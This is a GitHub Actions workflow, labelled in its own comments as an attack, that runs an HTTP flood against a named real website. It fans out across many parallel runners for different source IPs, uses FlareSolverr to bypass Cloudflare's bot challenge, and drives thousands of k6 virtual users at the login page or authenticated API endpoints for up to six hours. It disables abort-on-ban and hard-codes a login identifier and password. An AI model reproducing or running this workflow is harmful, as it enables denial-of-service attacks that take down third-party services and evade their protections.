name: HTTP Flood — thanhhuyreal

on:
  workflow_dispatch:
    inputs:
      mode:
        description: 'Che do tan cong'
        required: true
        default: 'login_flood'
        type: choice
        options:
          - login_flood      # Login flood qua Cloudflare (auto bypass)
          - auth_api_flood   # Login 1 lan, roi flood authenticated API (nang hon)
      runners:
        description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
        required: true
        default: '5'
      max_vus:
        description: 'Max VUs moi runner'
        required: false
        default: '2000'
      stages:
        description: 'Stages override (de trong = dung mac dinh)'
        required: false
        default: ''

jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          COUNT=${{ github.event.inputs.runners }}
          MATRIX=$(python3 -c "import json; print(json.dumps(list(range(1, int('$COUNT')+1))))")
          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT

  flood:
    needs: prepare
    name: "[${{ github.event.inputs.mode }}] Runner ${{ matrix.runner }}"
    runs-on: ubuntu-latest
    timeout-minutes: 360
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        runner: ${{ fromJson(needs.prepare.outputs.matrix) }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup k6 (native)
        uses: grafana/setup-k6-action@v1

      - name: Tang ulimit
        run: ulimit -n 131072 || true

      - name: Setup FlareSolverr (auto Cloudflare bypass)
        run: |
          echo "Installing FlareSolverr..."
          docker run -d \
            --name flaresolverr \
            -p 8191:8191 \
            -e LOG_LEVEL=info \
            ghcr.io/flaresolverr/flaresolverr:latest
          
          echo "Waiting for FlareSolverr to start..."
          for i in {1..30}; do
            if curl -sf http://localhost:8191/health > /dev/null; then
              echo "FlareSolverr ready!"
              break
            fi
            echo "Waiting... ($i/30)"
            sleep 2
          done

      - name: Get initial cf_clearance
        id: get_cookie
        run: |
          echo "Getting cf_clearance from FlareSolverr..."
          
          RESPONSE=$(curl -s -X POST http://localhost:8191/v1 \
            -H "Content-Type: application/json" \
            -d '{
              "cmd": "request.get",
              "url": "https://thanhhuyreal.com",
              "maxTimeout": 60000
            }')
          
          echo "FlareSolverr response:"
          echo "$RESPONSE" | jq '.' || echo "$RESPONSE"
          
          # Check if response is successful
          STATUS=$(echo "$RESPONSE" | jq -r '.status // "error"')
          if [ "$STATUS" != "ok" ]; then
            echo "ERROR: FlareSolverr failed"
            echo "Status: $STATUS"
            echo "Message: $(echo "$RESPONSE" | jq -r '.message // "unknown"')"
            exit 1
          fi
          
          # Extract cookie
          CF_CLEARANCE=$(echo "$RESPONSE" | jq -r '.solution.cookies[]? | select(.name=="cf_clearance") | .value // empty')
          CF_UA=$(echo "$RESPONSE" | jq -r '.solution.userAgent // "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"')
          
          if [ -z "$CF_CLEARANCE" ]; then
            echo "ERROR: cf_clearance not found in response"
            echo "Available cookies:"
            echo "$RESPONSE" | jq -r '.solution.cookies[]?.name // "none"'
            
            # Try without Cloudflare (maybe site doesn't have challenge)
            echo "Attempting direct access without cf_clearance..."
            CF_CLEARANCE="none"
            CF_UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"
          fi
          
          echo "cf_clearance=${CF_CLEARANCE}" >> $GITHUB_OUTPUT
          echo "cf_ua=${CF_UA}" >> $GITHUB_OUTPUT
          
          if [ "$CF_CLEARANCE" != "none" ]; then
            echo "✓ Got cf_clearance: ${CF_CLEARANCE:0:50}... (${#CF_CLEARANCE} chars)"
          else
            echo "⚠ No cf_clearance needed (no Cloudflare challenge)"
          fi
          
          echo "User-Agent: ${CF_UA:0:80}..."

      - name: Start cookie auto-refresh daemon
        run: |
          echo "Cookie auto-refresh: k6 uses initial cookie from env var"
          echo "For tests >30min, workflow should be re-run with fresh cookie"
          echo "Note: k6 cannot dynamically read files, so cookie refresh daemon is disabled"
          echo ""
          echo "Initial cookie will be valid for ~30 minutes"

      - name: Runner info
        run: |
          echo "Mode        : ${{ github.event.inputs.mode }}"
          echo "Runner      : ${{ matrix.runner }}"
          echo "Public IP   : $(curl -sf https://api.ipify.org || echo unknown)"
          echo "CPU cores   : $(nproc)"
          echo "RAM free    : $(free -m | awk '/Mem:/{print $4}') MB"
          echo "cf_clearance: $(cat /tmp/cf_clearance.txt | cut -c1-50)..."
          echo "User-Agent  : $(cat /tmp/cf_ua.txt | cut -c1-80)..."

      # ─────────────────────────────────────────────────────────────
      # MODE: login_flood — Login flood qua Cloudflare
      # ─────────────────────────────────────────────────────────────
      - name: "[login_flood] Cloudflare bypass + Login flood"
        if: ${{ github.event.inputs.mode == 'login_flood' }}
        env:
          PHP_BASE_URL:      "https://thanhhuyreal.com"
          PHP_LOGIN_PAGE:    "/?auth=login"
          PHP_LOGIN_PATH:    "/model/login"
          PHP_IDENTIFIER:    "lonussystem"
          PHP_PASSWORD:      "lonussystem123@"
          CF_CLEARANCE:      ${{ steps.get_cookie.outputs.cf_clearance }}
          CF_UA:             ${{ steps.get_cookie.outputs.cf_ua }}
          PHP_FRESH_SESSION: "true"
          STAGES:            ${{ github.event.inputs.stages || '30s:50,60s:200,60s:500,360m:500' }}
          START_RATE:        "20"
          PRE_VUS:           "100"
          MAX_VUS:           ${{ github.event.inputs.max_vus || '2000' }}
          REQUEST_TIMEOUT:   "20s"
          REQUEST_DELAY:     "0"
          MAX_5XX_RATE:      "0.9"
          MAX_TIMEOUT_RATE:  "0.9"
          ABORT_ON_BAN:      "false"
        run: |
          ulimit -n 131072 || true
          echo "Starting login flood attack..."
          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:50}..."
          k6 run --no-usage-report sites/thanhhuyreal/test-script-login.js

      # ─────────────────────────────────────────────────────────────
      # MODE: auth_api_flood — Login 1 lần, sau đó flood authenticated API
      # ─────────────────────────────────────────────────────────────
      - name: "[auth_api_flood] Login once, then flood API endpoints"
        if: ${{ github.event.inputs.mode == 'auth_api_flood' }}
        env:
          IP_URL:            "https://thanhhuyreal.com"
          SITE_HOST:         "thanhhuyreal.com"
          PHP_IDENTIFIER:    "lonussystem"
          PHP_PASSWORD:      "lonussystem123@"
          CF_CLEARANCE:      ${{ steps.get_cookie.outputs.cf_clearance }}
          CF_UA:             ${{ steps.get_cookie.outputs.cf_ua }}
          STAGES:            ${{ github.event.inputs.stages || '30s:200,60s:1000,60s:3000,360m:3000' }}
          START_RATE:        "50"
          PRE_VUS:           "300"
          MAX_VUS:           ${{ github.event.inputs.max_vus || '5000' }}
          REQUEST_TIMEOUT:   "30s"
          MAX_ERR_RATE:      "0.9"
        run: |
          ulimit -n 131072 || true
          echo "Starting authenticated API flood..."
          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:50}..."
          k6 run --no-usage-report sites/thanhhuyreal/test-script-auth.js

      - name: Cleanup
        if: always()
        run: |
          if [ -f /tmp/cookie-refresh.pid ]; then
            echo "Stopping cookie refresh daemon..."
            kill $(cat /tmp/cookie-refresh.pid) 2>/dev/null || true
          fi
          
          echo "Stopping FlareSolverr..."
          docker stop flaresolverr 2>/dev/null || true
          docker rm flaresolverr 2>/dev/null || true
          
          if [ -f /tmp/cookie-refresh.log ]; then
            echo "=== Cookie Refresh Log ==="
            tail -n 50 /tmp/cookie-refresh.log
          fi

      - name: Upload logs (if failed)
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: k6-results-runner-${{ matrix.runner }}
          path: |
            /tmp/k6-*.log
            /tmp/cookie-refresh.log
          retention-days: 7
